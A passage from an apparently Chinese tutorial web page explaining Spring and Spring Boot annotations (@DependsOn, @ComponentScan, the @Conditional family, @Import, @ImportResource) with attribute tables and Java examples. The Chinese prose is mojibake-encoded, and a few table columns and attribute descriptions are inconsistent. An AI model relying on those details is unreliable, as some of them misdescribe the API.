<li>ç”Ÿå‘½å‘¨æœŸï¼šæ”¯æŒæŒ‡å®šåˆå§‹åŒ–å’Œé”€æ¯æ–¹æ³•ï¼Œå¯¹åº” XML ä¸­çš„<code>init-method</code>å’Œ<code>destroy-method</code>ã€‚</li>
</ul>
<p><strong>å±æ€§è¯´æ˜ï¼š</strong></p>



































<table><thead><tr><th>å±æ€§</th><th>è¯´æ˜</th><th>è¡¥å……è¯´æ˜</th></tr></thead><tbody><tr><td>value</td><td>æŒ‡å®š Bean åç§°</td><td>ä¸<code>name</code>å±æ€§ç­‰ä»·ï¼Œä¼˜å…ˆçº§ç›¸åŒï¼Œæ”¯æŒæ•°ç»„å½¢å¼å®šä¹‰å¤šä¸ªåˆ«å</td></tr><tr><td>name</td><td>æŒ‡å®š Bean åç§°</td><td>æ¨èä½¿ç”¨ï¼Œè¯­ä¹‰æ›´æ¸…æ™°ï¼Œå¦‚<code>name = "userService"</code></td></tr><tr><td>autowireCandidate</td><td>æ˜¯å¦ä½œä¸ºè‡ªåŠ¨è£…é…å€™é€‰ Bean</td><td>â‘  <code>true</code>ï¼ˆé»˜è®¤ï¼‰ï¼šå…è®¸è¢«<code>@Autowired</code>è‡ªåŠ¨è£…é…ï¼›â‘¡ <code>false</code>ï¼šæ’é™¤è‡ªåŠ¨è£…é…ï¼Œä»…èƒ½é€šè¿‡<code>BeanFactory</code>æ‰‹åŠ¨è·å–</td></tr><tr><td>initMethod</td><td>åˆå§‹åŒ–æ–¹æ³•å</td><td>æ–¹æ³•éœ€æ— å‚ã€æ— è¿”å›å€¼ï¼ŒBean åˆå§‹åŒ–å®Œæˆåæ‰§è¡Œï¼Œæ›¿ä»£<code>InitializingBean</code>æ¥å£</td></tr><tr><td>destroyMethod</td><td>é”€æ¯æ–¹æ³•å</td><td>æ–¹æ³•éœ€æ— å‚ã€æ— è¿”å›å€¼ï¼Œå®¹å™¨å…³é—­æ—¶æ‰§è¡Œï¼ˆä»…å•ä¾‹ Bean ç”Ÿæ•ˆï¼‰ï¼Œæ›¿ä»£<code>DisposableBean</code>æ¥å£ï¼Œé»˜è®¤ä¼šæ£€æµ‹<code>close()</code>/<code>shutdown()</code>æ–¹æ³•</td></tr></tbody></table>
<h3 data-id="heading-3">3. @DependsOn</h3>
<p><code>@DependsOn</code> ç”¨äºå£°æ˜ Bean ä¹‹é—´çš„<strong>ä¾èµ–é¡ºåº</strong>ï¼Œç¡®ä¿æŒ‡å®š Bean åœ¨å½“å‰ Bean ä¹‹å‰åˆ›å»ºã€‚</p>
<ul>
<li>éå¼ºä¾èµ–ï¼šåŒºåˆ«äºå­—æ®µæ³¨å…¥ / æ„é€ å™¨æ³¨å…¥çš„ â€œä¾èµ–æ³¨å…¥â€ï¼Œä»…ä¿è¯åˆ›å»ºé¡ºåºï¼Œä¸æ¶‰åŠå±æ€§èµ‹å€¼ï¼›</li>
<li>é€‚ç”¨åœºæ™¯ï¼šå¦‚æ•°æ®æº Bean éœ€åœ¨æ•°æ®è®¿é—® Bean ä¹‹å‰åˆå§‹åŒ–ï¼Œæˆ–å¯åŠ¨æ—¶éœ€å…ˆåŠ è½½é…ç½® Beanã€‚</li>
</ul>
<p><strong>å±æ€§è¯´æ˜ï¼š</strong></p>














<table><thead><tr><th>å±æ€§</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>value</td><td>ä¾èµ–çš„ Bean åç§°æ•°ç»„</td><td>å¦‚<code>value = {"dataSource", "redisTemplate"}</code></td></tr></tbody></table>
<p><strong>ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DependsOnConfig</span> {
 Â  <span class="hljs-meta">@Bean</span>
 Â  <span class="hljs-keyword">public</span> DataSource <span class="hljs-title function_">dataSource</span><span class="hljs-params">()</span> {
 Â  Â  Â  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DruidDataSource</span>();
 Â  }
 Â  <span class="hljs-meta">@Bean</span>
 Â  <span class="hljs-meta">@DependsOn("dataSource")</span> <span class="hljs-comment">// ç¡®ä¿ dataSource å…ˆåˆ›å»º</span>
 Â  <span class="hljs-keyword">public</span> JdbcTemplate <span class="hljs-title function_">jdbcTemplate</span><span class="hljs-params">()</span> {
 Â  Â  Â  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JdbcTemplate</span>(dataSource());
 Â  }
}
</code></pre>
<h3 data-id="heading-4">4. @ComponentScan</h3>
<p><code>@ComponentScan</code> ç”¨äºæŒ‡å®š Spring æ‰«æ Bean çš„åŒ…è·¯å¾„ï¼Œè‡ªåŠ¨æ³¨å†Œæ ‡æ³¨äº†<code>@Component</code>/<code>@Service</code>/<code>@Repository</code>/<code>@Controller</code>çš„ç±»ã€‚</p>
<ul>
<li>æ ¸å¿ƒé€»è¾‘ï¼šé€šè¿‡è¿‡æ»¤å™¨ï¼ˆFilterï¼‰ç­›é€‰éœ€è¦çº³å…¥å®¹å™¨çš„ç±»ï¼Œæ”¯æŒåŒ…å« / æ’é™¤è§„åˆ™ï¼›</li>
<li>é»˜è®¤è¡Œä¸ºï¼šæœªæŒ‡å®šåŒ…è·¯å¾„æ—¶ï¼Œæ‰«æå½“å‰æ³¨è§£æ‰€åœ¨ç±»çš„åŒ…åŠå…¶å­åŒ…ã€‚</li>
</ul>
<p><strong>å±æ€§è¯´æ˜ï¼š</strong></p>























































<table><thead><tr><th>å±æ€§</th><th>è¯´æ˜</th><th>è¡¥å……è¯´æ˜</th></tr></thead><tbody><tr><td>value</td><td>æ‰«æçš„åŸºç¡€åŒ…è·¯å¾„</td><td>ä¸<code>basePackages</code>ç­‰ä»·ï¼Œå¦‚<code>value = "com.example.service"</code></td></tr><tr><td>nameGenerator</td><td>Bean åç§°ç”Ÿæˆå™¨</td><td>è‡ªå®šä¹‰ Bean åç§°è§„åˆ™ï¼Œéœ€å®ç°<code>BeanNameGenerator</code>æ¥å£</td></tr><tr><td>scopeResolver</td><td>Bean ä½œç”¨åŸŸè§£æå™¨</td><td>è‡ªå®šä¹‰ä½œç”¨åŸŸè§£æé€»è¾‘ï¼Œéœ€å®ç°<code>ScopeMetadataResolver</code>æ¥å£</td></tr><tr><td>basePackages</td><td>æŒ‡å®šæ‰«æçš„åŸºç¡€åŒ…</td><td>æ”¯æŒæ•°ç»„å½¢å¼ï¼Œå¦‚<code>basePackages = {"com.example.service", "com.example.dao"}</code></td></tr><tr><td>basePackageClasses</td><td>æŒ‡å®šæ‰«æçš„åŸºå‡†ç±»</td><td>æ‰«ææŒ‡å®šç±»æ‰€åœ¨çš„åŒ…ï¼Œå¦‚<code>basePackageClasses = UserService.class</code></td></tr><tr><td>useDefaultFilters</td><td>æ˜¯å¦å¯ç”¨é»˜è®¤è¿‡æ»¤å™¨</td><td>â‘  <code>true</code>ï¼ˆé»˜è®¤ï¼‰ï¼šæ‰«æ<code>@Component</code>åŠå…¶è¡ç”Ÿæ³¨è§£ï¼›â‘¡ <code>false</code>ï¼šä»…æ‰«æè‡ªå®šä¹‰è¿‡æ»¤å™¨åŒ¹é…çš„ç±»</td></tr><tr><td>includeFilters</td><td>åŒ…å«è¿‡æ»¤å™¨</td><td>ä»…åŒ¹é…è§„åˆ™çš„ç±»è¢«æ‰«æï¼Œå¦‚æŒ‡å®šæ‰«ææ ‡æ³¨<code>@MyAnnotation</code>çš„ç±»</td></tr><tr><td>excludeFilters</td><td>æ’é™¤è¿‡æ»¤å™¨</td><td>åŒ¹é…è§„åˆ™çš„ç±»ä¸è¢«æ‰«æï¼Œå¦‚æ’é™¤<code>@Controller</code>æ ‡æ³¨çš„ç±»</td></tr><tr><td>lazyInit</td><td>æ˜¯å¦æ‡’åŠ è½½æ‰«æåˆ°çš„ Bean</td><td>â‘  <code>true</code>ï¼šæ‰€æœ‰æ‰«æçš„ Bean å‡æ‡’åŠ è½½ï¼›â‘¡ <code>false</code>ï¼ˆé»˜è®¤ï¼‰ï¼šå•ä¾‹ Bean ç«‹å³åŠ è½½</td></tr></tbody></table>
<p><strong>ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-comment">// æ‰«ææŒ‡å®šåŒ…ï¼Œæ’é™¤ Controllerï¼Œä»…åŒ…å« Service</span>
<span class="hljs-meta">@ComponentScan(
 Â  basePackages = "com.example",
 Â  excludeFilters = @ComponentScan.Filter(type = FilterType.ANNOTATION, value = Controller.class),
 Â  includeFilters = @ComponentScan.Filter(type = FilterType.ANNOTATION, value = Service.class)
)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ScanConfig</span> {
}
</code></pre>
<h3 data-id="heading-5">5. @ConditionalOnBean</h3>
<p><code>@ConditionalOnBean</code> æ˜¯ Spring Boot æ¡ä»¶æ³¨è§£ï¼Œä»…å½“å®¹å™¨ä¸­å­˜åœ¨æŒ‡å®š Bean æ—¶ï¼Œæ‰åŠ è½½å½“å‰ Beanã€‚</p>
<ul>
<li>é€‚ç”¨åœºæ™¯ï¼šæŒ‰éœ€åŠ è½½ Beanï¼Œå¦‚ä»…å½“ RedisTemplate å­˜åœ¨æ—¶ï¼Œæ‰åˆ›å»º Redis ç¼“å­˜ç®¡ç†å™¨ã€‚</li>
</ul>
<p><strong>å±æ€§è¯´æ˜ï¼š</strong></p>








































<table><thead><tr><th>å±æ€§</th><th>è¯´æ˜</th><th>è¡¥å……è¯´æ˜</th></tr></thead><tbody><tr><td>value</td><td>æŒ‡å®š Bean çš„ Class ç±»å‹</td><td>å¦‚<code>value = RedisTemplate.class</code></td></tr><tr><td>type</td><td>æŒ‡å®š Bean çš„ç±»å‹åç§°</td><td>å­—ç¬¦ä¸²å½¢å¼ï¼Œé¿å…ç±»ä¾èµ–ï¼Œå¦‚<code>type = "org.springframework.data.redis.core.RedisTemplate"</code></td></tr><tr><td>annotation</td><td>æŒ‡å®š Bean éœ€åŒ…å«çš„æ³¨è§£</td><td>å¦‚<code>annotation = Repository.class</code>ï¼ˆä»…æ‰«ææ ‡æ³¨ @Repository çš„ Beanï¼‰</td></tr><tr><td>name</td><td>æŒ‡å®š Bean çš„åç§°</td><td>å¦‚<code>name = "redisTemplate"</code></td></tr><tr><td>search</td><td>æ˜¯å¦æœç´¢çˆ¶å®¹å™¨ / ç¥–å…ˆå®¹å™¨</td><td>æšä¸¾å€¼ï¼š<code>SearchStrategy.CURRENT</code>ï¼ˆä»…å½“å‰å®¹å™¨ï¼Œé»˜è®¤ï¼‰ã€<code>SearchStrategy.PARENTS</code>ï¼ˆçˆ¶å®¹å™¨ï¼‰ã€<code>SearchStrategy.ALL</code>ï¼ˆæ‰€æœ‰ç¥–å…ˆå®¹å™¨ï¼‰</td></tr><tr><td>parameterizedContainer</td><td>æŒ‡å®šå‚æ•°åŒ–ç±»å‹å®¹å™¨</td><td>åŒ¹é…æ³›å‹å®¹å™¨ä¸­çš„ Beanï¼Œå¦‚<code>parameterizedContainer = List.class</code>ï¼ˆåŒ¹é… List ç±»å‹çš„ Beanï¼‰</td></tr></tbody></table>
<p><strong>ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConditionalBeanConfig</span> {
 Â  <span class="hljs-meta">@Bean</span>
 Â  <span class="hljs-keyword">public</span> RedisTemplate&lt;String, Object&gt; <span class="hljs-title function_">redisTemplate</span><span class="hljs-params">()</span> {
 Â  Â  Â  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RedisTemplate</span>&lt;&gt;();
 Â  }
 Â  <span class="hljs-comment">// ä»…å½“ redisTemplate å­˜åœ¨æ—¶ï¼Œåˆ›å»º RedisCacheManager</span>
 Â  <span class="hljs-meta">@Bean</span>
 Â  <span class="hljs-meta">@ConditionalOnBean(name = "redisTemplate")</span>
 Â  <span class="hljs-keyword">public</span> RedisCacheManager <span class="hljs-title function_">cacheManager</span><span class="hljs-params">()</span> {
 Â  Â  Â  <span class="hljs-keyword">return</span> RedisCacheManager.builder(redisTemplate()).build();
 Â  }
}
</code></pre>
<h3 data-id="heading-6">6. @ConditionalOnMissingBean</h3>
<p><code>@ConditionalOnMissingBean</code> ä¸<code>@ConditionalOnBean</code>ç›¸åï¼Œä»…å½“å®¹å™¨ä¸­<strong>ä¸å­˜åœ¨</strong>æŒ‡å®š Bean æ—¶ï¼Œæ‰åŠ è½½å½“å‰ Beanã€‚</p>
<ul>
<li>æ ¸å¿ƒç”¨é€”ï¼šå®ç° â€œé»˜è®¤ Beanâ€ é€»è¾‘ï¼Œå¦‚è‡ªå®šä¹‰ Bean ä¸å­˜åœ¨æ—¶ï¼ŒåŠ è½½æ¡†æ¶é»˜è®¤å®ç°ã€‚</li>
</ul>
<p><strong>å±æ€§è¯´æ˜ï¼š</strong></p>



















<table><thead><tr><th>å±æ€§</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>ignored</td><td>å¿½ç•¥åŒ¹é…çš„ Class</td><td>æ’é™¤æŒ‡å®šç±»å‹çš„ Beanï¼Œå¦‚<code>ignored = CustomRedisTemplate.class</code></td></tr><tr><td>ignoredType</td><td>å¿½ç•¥åŒ¹é…çš„ç±»å‹åç§°</td><td>å­—ç¬¦ä¸²å½¢å¼ï¼Œå¦‚<code>ignoredType = "com.example.CustomRedisTemplate"</code></td></tr></tbody></table>
<p><strong>ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DefaultBeanConfig</span> {
 Â  <span class="hljs-comment">// ä»…å½“å®¹å™¨ä¸­æ—  UserService æ—¶ï¼ŒåŠ è½½é»˜è®¤å®ç°</span>
 Â  <span class="hljs-meta">@Bean</span>
 Â  <span class="hljs-meta">@ConditionalOnMissingBean(type = "com.example.service.UserService")</span>
 Â  <span class="hljs-keyword">public</span> UserService <span class="hljs-title function_">defaultUserService</span><span class="hljs-params">()</span> {
 Â  Â  Â  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultUserService</span>();
 Â  }
}
</code></pre>
<h3 data-id="heading-7">7. @ConditionalOnClass</h3>
<p><code>@ConditionalOnClass</code> ä»…å½“ç±»è·¯å¾„ä¸­å­˜åœ¨æŒ‡å®š Class æ—¶ï¼Œæ‰åŠ è½½å½“å‰ Beanã€‚</p>
<ul>
<li>é€‚ç”¨åœºæ™¯ï¼šé€‚é…ä¸åŒä¾èµ–ç¯å¢ƒï¼Œå¦‚ä»…å½“å¼•å…¥ MyBatis ä¾èµ–æ—¶ï¼ŒåŠ è½½ MyBatis é…ç½® Beanã€‚</li>
</ul>
<p><strong>å±æ€§è¯´æ˜ï¼š</strong></p>




















<table><thead><tr><th>å±æ€§</th><th>è¯´æ˜</th><th>è¡¥å……è¯´æ˜</th></tr></thead><tbody><tr><td>value</td><td>æŒ‡å®š Class ç±»å‹</td><td>å¦‚<code>value = SqlSessionFactory.class</code></td></tr><tr><td>name</td><td>æŒ‡å®š Class å…¨é™å®šå</td><td>é¿å…ç¼–è¯‘æœŸä¾èµ–ï¼Œå¦‚<code>name = "org.apache.ibatis.session.SqlSessionFactory"</code></td></tr></tbody></table>
<p><strong>ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-comment">// ä»…å½“ç±»è·¯å¾„å­˜åœ¨ SqlSessionFactory æ—¶ï¼ŒåŠ è½½ MyBatis é…ç½®</span>
<span class="hljs-meta">@ConditionalOnClass(SqlSessionFactory.class)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyBatisConfig</span> {
 Â  <span class="hljs-meta">@Bean</span>
 Â  <span class="hljs-keyword">public</span> SqlSessionFactory <span class="hljs-title function_">sqlSessionFactory</span><span class="hljs-params">(DataSource dataSource)</span> <span class="hljs-keyword">throws</span> Exception {
 Â  Â  Â  <span class="hljs-type">SqlSessionFactoryBean</span> <span class="hljs-variable">factoryBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SqlSessionFactoryBean</span>();
 Â  Â  Â  factoryBean.setDataSource(dataSource);
 Â  Â  Â  <span class="hljs-keyword">return</span> factoryBean.getObject();
 Â  }
}
</code></pre>
<h3 data-id="heading-8">8. @ConditionalOnMissingClass</h3>
<p><code>@ConditionalOnMissingClass</code> ä»…å½“ç±»è·¯å¾„ä¸­<strong>ä¸å­˜åœ¨</strong>æŒ‡å®š Class æ—¶ï¼Œæ‰åŠ è½½å½“å‰ Beanã€‚</p>
<ul>
<li>é€‚ç”¨åœºæ™¯ï¼šé™çº§å¤„ç†ï¼Œå¦‚æœªå¼•å…¥æŸä¸ªä¾èµ–æ—¶ï¼ŒåŠ è½½å…œåº•å®ç°ã€‚</li>
</ul>
<p><strong>å±æ€§è¯´æ˜ï¼š</strong></p>














<table><thead><tr><th>å±æ€§</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>value</td><td>æŒ‡å®š Class å…¨é™å®šåæ•°ç»„</td><td>å¦‚<code>value = "org.springframework.data.redis.core.RedisTemplate"</code></td></tr></tbody></table>
<p><strong>ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-comment">// æœªå¼•å…¥ Redis æ—¶ï¼ŒåŠ è½½æœ¬åœ°ç¼“å­˜</span>
<span class="hljs-meta">@ConditionalOnMissingClass("org.springframework.data.redis.core.RedisTemplate")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LocalCacheConfig</span> {
 Â  <span class="hljs-meta">@Bean</span>
 Â  <span class="hljs-keyword">public</span> CacheManager <span class="hljs-title function_">localCacheManager</span><span class="hljs-params">()</span> {
 Â  Â  Â  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentMapCacheManager</span>();
 Â  }
}
</code></pre>
<h3 data-id="heading-9">9. @ConditionalOnProperty</h3>
<p><code>@ConditionalOnProperty</code> ä»…å½“é…ç½®æ–‡ä»¶ä¸­å­˜åœ¨æŒ‡å®šå±æ€§ï¼ˆä¸”å€¼åŒ¹é…ï¼‰æ—¶ï¼Œæ‰åŠ è½½å½“å‰ Beanã€‚</p>
<ul>
<li>æ ¸å¿ƒç”¨é€”ï¼šé€šè¿‡é…ç½®å¼€å…³æ§åˆ¶ Bean åŠ è½½ï¼Œå®ç°ç¯å¢ƒé€‚é…ã€‚</li>
</ul>
<p><strong>å±æ€§è¯´æ˜ï¼š</strong></p>



































<table><thead><tr><th>å±æ€§</th><th>è¯´æ˜</th><th>è¡¥å……è¯´æ˜</th></tr></thead><tbody><tr><td>value</td><td>å±æ€§åæ•°ç»„</td><td>ä¸<code>name</code>ç­‰ä»·ï¼Œå¦‚<code>value = "spring.cache.enabled"</code></td></tr><tr><td>prefix</td><td>å±æ€§åå‰ç¼€</td><td>ç®€åŒ–å±æ€§åä¹¦å†™ï¼Œå¦‚<code>prefix = "spring.cache"</code> + <code>name = "enabled"</code> ç­‰ä»·äº<code>spring.cache.enabled</code></td></tr><tr><td>name</td><td>å±æ€§å</td><td>æ”¯æŒæ•°ç»„ï¼Œå¦‚<code>name = {"enabled", "type"}</code></td></tr><tr><td>havingValue</td><td>æŒ‡å®šå±æ€§å€¼</td><td>åŒ¹é…å±æ€§çš„å…·ä½“å€¼ï¼Œå¦‚<code>havingValue = "redis"</code></td></tr><tr><td>matchIfMissing</td><td>å±æ€§ä¸å­˜åœ¨æ—¶æ˜¯å¦åŒ¹é…</td><td>â‘  <code>true</code>ï¼šå±æ€§ä¸å­˜åœ¨æ—¶ä»åŠ è½½ Beanï¼›â‘¡ <code>false</code>ï¼ˆé»˜è®¤ï¼‰ï¼šå±æ€§ä¸å­˜åœ¨åˆ™ä¸åŠ è½½</td></tr></tbody></table>
<p><strong>ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-comment">// å½“ spring.cache.enabled=true ä¸” type=redis æ—¶ï¼ŒåŠ è½½ Redis ç¼“å­˜</span>
<span class="hljs-meta">@ConditionalOnProperty(
 Â  prefix = "spring.cache",
 Â  name = {"enabled", "type"},
 Â  havingValue = "redis",
 Â  matchIfMissing = false
)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RedisCacheConfig</span> {
 Â  <span class="hljs-comment">// ...</span>
}
</code></pre>
<h3 data-id="heading-10">10. @ConditionalOnResource</h3>
<p><code>@ConditionalOnResource</code> ä»…å½“ç±»è·¯å¾„ä¸­å­˜åœ¨æŒ‡å®šèµ„æºæ–‡ä»¶æ—¶ï¼Œæ‰åŠ è½½å½“å‰ Beanã€‚</p>
<ul>
<li>é€‚ç”¨åœºæ™¯ï¼šåŠ è½½è‡ªå®šä¹‰é…ç½®æ–‡ä»¶ï¼Œå¦‚ä»…å½“å­˜åœ¨<code>app-custom.properties</code>æ—¶ï¼ŒåŠ è½½å¯¹åº”é…ç½®ã€‚</li>
</ul>
<p><strong>å±æ€§è¯´æ˜ï¼š</strong></p>















<table><thead><tr><th>å±æ€§</th><th>è¯´æ˜</th><th>è¡¥å……è¯´æ˜</th></tr></thead><tbody><tr><td>value</td><td>èµ„æºè·¯å¾„æ•°ç»„</td><td>æ”¯æŒ classpath è·¯å¾„ï¼Œå¦‚<code>value = "classpath:app-custom.properties"</code></td></tr></tbody></table>
<p><strong>ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-comment">// ä»…å½“å­˜åœ¨è‡ªå®šä¹‰é…ç½®æ–‡ä»¶æ—¶ï¼ŒåŠ è½½é…ç½®</span>
<span class="hljs-meta">@ConditionalOnResource(resources = "classpath:app-custom.properties")</span>
<span class="hljs-meta">@PropertySource("classpath:app-custom.properties")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomConfig</span> {
 Â  <span class="hljs-comment">// ...</span>
}
</code></pre>
<h3 data-id="heading-11">11. @ConditionalOnSingleCandidate</h3>
<p><code>@ConditionalOnSingleCandidate</code> ä»…å½“å®¹å™¨ä¸­æŒ‡å®šç±»å‹çš„ Bean<strong>ä»…æœ‰ä¸€ä¸ªå€™é€‰ Bean</strong>ï¼ˆæˆ–æœ‰ @Primary æ ‡è®°çš„ Beanï¼‰æ—¶ï¼Œæ‰åŠ è½½å½“å‰ Beanã€‚</p>
<ul>
<li>é€‚ç”¨åœºæ™¯ï¼šé¿å…å¤š Bean å†²çªï¼Œå¦‚ä»…å½“æ•°æ®æº Bean å”¯ä¸€æ—¶ï¼ŒåŠ è½½ JdbcTemplateã€‚</li>
</ul>
<p><strong>å±æ€§è¯´æ˜ï¼š</strong></p>
























<table><thead><tr><th>å±æ€§</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>value</td><td>Bean çš„ Class ç±»å‹</td><td>å¦‚<code>value = DataSource.class</code></td></tr><tr><td>type</td><td>Bean çš„ Class å…¨é™å®šå</td><td>å¦‚<code>type = "javax.sql.DataSource"</code></td></tr><tr><td>search</td><td>æ˜¯å¦æœç´¢çˆ¶å®¹å™¨</td><td>åŒ<code>@ConditionalOnBean</code>çš„ search å±æ€§</td></tr></tbody></table>
<p><strong>ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-comment">// ä»…å½“æ•°æ®æº Bean å”¯ä¸€æ—¶ï¼Œåˆ›å»º JdbcTemplate</span>
<span class="hljs-meta">@ConditionalOnSingleCandidate(DataSource.class)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JdbcConfig</span> {
 Â  <span class="hljs-meta">@Bean</span>
 Â  <span class="hljs-keyword">public</span> JdbcTemplate <span class="hljs-title function_">jdbcTemplate</span><span class="hljs-params">(DataSource dataSource)</span> {
 Â  Â  Â  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JdbcTemplate</span>(dataSource);
 Â  }
}
</code></pre>
<h3 data-id="heading-12">12. @Import</h3>
<p><code>@Import</code> ç”¨äºæ‰‹åŠ¨å¯¼å…¥ Bean åˆ°å®¹å™¨ï¼Œæ”¯æŒä¸‰ç§å¯¼å…¥æ–¹å¼ï¼Œæ˜¯æ‰©å±• Spring å®¹å™¨çš„æ ¸å¿ƒæ³¨è§£ã€‚</p>
<ul>
<li>æ ¸å¿ƒä¼˜åŠ¿ï¼šæ— éœ€æ‰«æï¼Œç›´æ¥æ˜¾å¼æ³¨å†Œ Beanï¼Œçµæ´»æ§åˆ¶ Bean åŠ è½½é€»è¾‘ã€‚</li>
</ul>
<p><strong>å±æ€§è¯´æ˜ï¼š</strong></p>















<table><thead><tr><th>å±æ€§</th><th>è¯´æ˜</th><th>è¡¥å……è¯´æ˜</th></tr></thead><tbody><tr><td>value</td><td>å¯¼å…¥çš„ Class æ•°ç»„</td><td>æ”¯æŒä¸‰ç§ç±»å‹ï¼šâ‘  æ™®é€šé…ç½®ç±»ï¼ˆ@Configuration æ ‡æ³¨ï¼‰ï¼›â‘¡ ImportSelector å®ç°ç±»ï¼ˆè¿”å› Class å…¨é™å®šåï¼Œæ‰¹é‡å¯¼å…¥ï¼‰ï¼›â‘¢ ImportBeanDefinitionRegistrar å®ç°ç±»ï¼ˆæ‰‹åŠ¨æ³¨å†Œ BeanDefinitionï¼‰</td></tr></tbody></table>
<p><strong>ç¤ºä¾‹ 1ï¼šå¯¼å…¥æ™®é€šé…ç½®ç±»</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-meta">@Import(MyBatisConfig.class)</span> <span class="hljs-comment">// å¯¼å…¥ MyBatis é…ç½®ç±»</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AppMainConfig</span> {
}
</code></pre>
<p><strong>ç¤ºä¾‹ 2ï¼šImportSelector å®ç°ç±»</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// è‡ªå®šä¹‰ ImportSelector</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyImportSelector</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ImportSelector</span> {
 Â  <span class="hljs-meta">@Override</span>
 Â  <span class="hljs-keyword">public</span> String[] selectImports(AnnotationMetadata importingClassMetadata) {
 Â  Â  Â  <span class="hljs-comment">// æ‰¹é‡å¯¼å…¥ä¸¤ä¸ª Bean</span>
 Â  Â  Â  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]{<span class="hljs-string">"com.example.service.UserService"</span>, <span class="hljs-string">"com.example.dao.UserDao"</span>};
 Â  }
}
<span class="hljs-comment">// å¯¼å…¥ Selector</span>
<span class="hljs-meta">@Configuration</span>
<span class="hljs-meta">@Import(MyImportSelector.class)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SelectorConfig</span> {
}
</code></pre>
<h3 data-id="heading-13">13. @ImportResource</h3>
<p><code>@ImportResource</code> ç”¨äºå¯¼å…¥ä¼ ç»Ÿ XML é…ç½®æ–‡ä»¶ä¸­çš„ Beanï¼Œå®ç°æ³¨è§£ä¸ XML é…ç½®çš„å…¼å®¹ã€‚</p>
<ul>
<li>é€‚ç”¨åœºæ™¯ï¼šè¿ç§»è€é¡¹ç›®æ—¶ï¼Œä¿ç•™ XML é…ç½®ï¼Œé€æ­¥è¿‡æ¸¡åˆ°æ³¨è§£é…ç½®ã€‚</li>
</ul>
<p><strong>å±æ€§è¯´æ˜ï¼š</strong></p>

























<table><thead><tr><th>å±æ€§</th><th>è¯´æ˜</th><th>è¡¥å……è¯´æ˜</th></tr></thead><tbody><tr><td>value</td><td>XML æ–‡ä»¶è·¯å¾„æ•°ç»„</td><td>ä¸<code>locations</code>ç­‰ä»·ï¼Œå¦‚<code>value = "classpath:spring-dao.xml"</code></td></tr><tr><td>locations</td><td>XML æ–‡ä»¶è·¯å¾„æ•°ç»„</td><td>æ”¯æŒå¤šä¸ªæ–‡ä»¶ï¼Œå¦‚<code>locations = {"classpath:spring-service.xml", "classpath:spring-dao.xml"}</code></td></tr><tr><td>reader</td><td>è‡ªå®šä¹‰ BeanDefinition è¯»å–å™¨</td><td>éœ€å®ç°<code>BeanDefinitionReader</code>æ¥å£ï¼Œè‡ªå®šä¹‰ XML è§£æé€»è¾‘</td></tr></tbody></table>
<p><strong>ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-meta">@ImportResource(locations = "classpath:spring-legacy.xml")</span> <span class="hljs-comment">// å¯¼å…¥ XML é…ç½®</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LegacyConfig</span> {
}
</code></pre>
<h3 data-id="heading-14">14. @Lazy</h3>
